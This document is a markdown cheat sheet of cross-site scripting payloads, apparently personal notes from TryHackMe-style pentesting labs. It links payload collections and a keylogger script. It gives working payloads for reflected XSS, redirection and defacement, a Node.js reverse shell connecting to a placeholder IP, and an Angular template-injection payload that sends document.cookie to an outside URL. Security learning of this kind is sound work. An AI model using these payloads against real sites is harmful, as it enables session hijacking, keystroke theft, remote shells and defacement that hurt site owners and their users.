# XSS Cross Site Scripting

Payloads can be written in Javascript, VBScript, Flash and CSS.  
## Check this GitHub
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection  
XSS-Payloads.com

### XSS Keylogger 
(http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) 
- You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.

### Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) 
- A mini local port scanner (more information on this is covered in the TryHackMe XSS room).


# Reflected XSS : Client-Side
Example : 
```url
http://10.10.186.74/#/track-result?id=<iframe src="javascript:alert(`xss`)">
```

## Redirect
```js
window.location='URL'
```

## Defacing
```html
<script>document.querySelector('#div_id').textContent = 'I am a hacker'</script>

<span id='div_id'>I'm a football lover</span>
```

## Reverse shell 

```html
<script>
(function(){ 
	var net = require("net"), 
	cp = require("child_process"), 
	sh = cp.spawn("/bin/sh", []); 
	var client = new net.Socket(); 
	client.connect(LOCAL_PORT_HERE, "LOCAL_IP_HERE", function(){ 
								client.pipe(sh.stdin); 
								sh.stdout.pipe(client); 
								sh.stderr.pipe(client); }
			); 
	return /a/; })();
</script>
```

## DOM Based XSS

That happens when some code is directly displayed in a `<script>...code...</script>`

## Angular
```javascript
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

```url
http://targeturl.com/?name={{constructor.constructor("var x = document.cookie; var url = `https://myurl.com?c=` + x ; document.location=url")()}}=
```